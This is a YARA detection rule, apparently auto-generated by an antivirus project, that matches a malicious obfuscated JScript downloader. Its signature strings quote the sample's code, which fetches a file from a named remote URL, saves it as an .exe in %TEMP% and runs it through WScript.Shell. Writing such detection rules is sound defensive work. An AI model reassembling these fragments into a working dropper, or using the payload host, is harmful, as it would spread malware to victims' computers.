rule sig_20160329_4e644f3b1439dbdd7337d0f0b630476d {
  meta:
    description = "datamaliciousorder - file 20160329_4e644f3b1439dbdd7337d0f0b630476d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1520f78af4cf3e9bc051369f22661bd01bef4255922fe15d30dd065d3ecdb2f2"

  strings:
    $s1  = "function Vuwwvzgs() {return Azuyrnmou[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"3Jpu0WUC.exe\";};" fullword ascii
    $s2  = "Rffilbtswe[Ddltpf](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Notywky](Vjghbuymo() * 11)} while (Rffilbtswe[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Omawcu(Ubuuwe, Klgmlvqw){return Ubuuwe - Klgmlvqw;};" fullword ascii
    $s5  = "var Azuyrnmou = function Bvcymvs() {return WScript[Cjpxqs](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Niltrclzjv(Fsrgurocu){Azuyrnmou[\"Run\"](Fsrgurocu, Jgylopy, Jgylopy);};" fullword ascii
    $s7  = "function Kibscdfzj() {return ((Fkyaampffz == true) && (Fkyaampffz == Slfynbizzk)) ? 1 : Jgylopy;};" fullword ascii
    $s8  = "Slfynbizzk = true; " fullword ascii
    $s9  = "Fkyaampffz = true; " fullword ascii
    $s10 = "var Fdzalgl = new this[\"Date\"]();" fullword ascii
    $s11 = "function Ccixyoyaz(){return Joutsndcho;};" fullword ascii
    $s12 = "function Cqlflhbu(Waqzpjb) {var Rsteyckin = (1, 2, 3, 4, 5, Waqzpjb); return Rsteyckin;};" fullword ascii
    $s13 = "function Fviko(){return Cjpxqs;};" fullword ascii
    $s14 = "function Vjghbuymo(){return 22;};" fullword ascii
    $s15 = "var Scjlt = false;" fullword ascii
    $s16 = " while (Phwpl){" fullword ascii
    $s17 = "return Omawcu(Qqufrbi, Xkcbodzvae);" fullword ascii
    $s18 = "var Slfynbizzk = false;" fullword ascii
    $s19 = "var Fkyaampffz = false;" fullword ascii
    $s20 = "function Laekgfcnfn()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}